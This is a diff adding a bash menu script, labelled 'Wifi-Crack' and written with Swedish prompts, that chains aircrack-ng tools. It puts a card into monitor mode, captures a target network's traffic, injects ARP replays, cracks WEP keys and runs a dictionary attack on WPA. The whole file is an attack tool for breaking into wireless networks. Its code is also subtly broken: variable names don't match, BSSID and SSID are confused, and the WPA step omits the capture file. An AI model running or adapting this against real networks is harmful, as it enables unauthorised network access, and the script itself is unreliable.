@@ -1,0 +1,82 @@
+#!/bin/bash
+#Wifi-Crack, made by uzi          
+#Probably dont work, without minor modifications!
+
+	function Step1 {
+	clear
+	airmon-ng stop wlan0 && ifconfig wlan0 down && airmon-ng start wlan0 && airodump-ng mon0
+}
+	function Step2 {
+	clear
+	echo -n Skriv "CHANNEL"
+	read CHANNEL
+	echo -n Skriv "SSID" att analysera
+	read SSID
+	airodump-ng -c $CHANNEL -w wifi --bssid $SSID wlan0 
+	#Alternativ rad airodump-ng -c $CHANNEL -w wifi --bssid $SSID mon0
+}
+	function Step3 {
+	clear
+	echo -n Skriv SSID att "PENETRERA"
+	read PENETRERA
+	echo -n Skriv wlan0 "Mac"
+	read Mac
+	aireplay-ng -1 0 -a $PENETRERA -h $MAC mon0 && aireplay-ng -3 -b $PENETRERA -h $MAC wlan0 
+#Alternativ rad aireplay-ng -1 0 -a $PENETRERA -h $MAC mon0 && aireplay-ng -3 -b $PENETRERA -h $MAC mon0
+}
+	function Step4 {
+	clear
+	echo -n Skriv SSID att "CRACKA"
+	read CRACKA
+	aircrack-ng -b $CRACKA wifi-01.cap 
+}
+	function Step5 {
+	clear 
+	kismet
+}
+	function Step6 {
+	clear 
+	echo -n Skriv wlan0 "Mac"
+	read Mac
+	aircrack-ng -a 2 -b $MAC -w /usr/share/dict/words 
+#Ordlistan /usr/share/dict/words
+}
+	function menu {
+	clear
+	echo -e "\t\t\tWifi-Hack Meny\n"
+	echo -e "\ta. Step 1 Analysera tillgängliga nätverk, switcha wlan till monitormode"
+	echo -e "\tb. Step 2 Riktad Analys, Trafik mot specifikt nätverk"
+	echo -e "\tc. Step 3 Hämta data över WEP"
+	echo -e "\td. Step 4 Cracka WEP"
+	echo -e "\te. Step 5 Analysera tillgängliga nätverk även dolda"
+	echo -e "\tf. Step 6 Cracka WPA"
+	echo -e "\t0. Avsluta Program\n\n"
+	read -n 1 option
+}
+	while [ 1 ]
+	do
+	menu
+	case $option in
+	a)
+	Step1 ;;
+	b)
+	Step2 ;;
+	c)
+	Step3 ;;
+	d)
+	Step4 ;;
+	e)
+	Step5 ;;
+	f)
+	Step6 ;;
+	0)
+	break ;;
+	*)
+	clear
+	echo "Fel Val" ;;
+	esac
+	echo -en "\n\n\t\t\tTryck på valfri tangent för att fortsätta"
+	read -n 1 line
+	done
+	clear
+
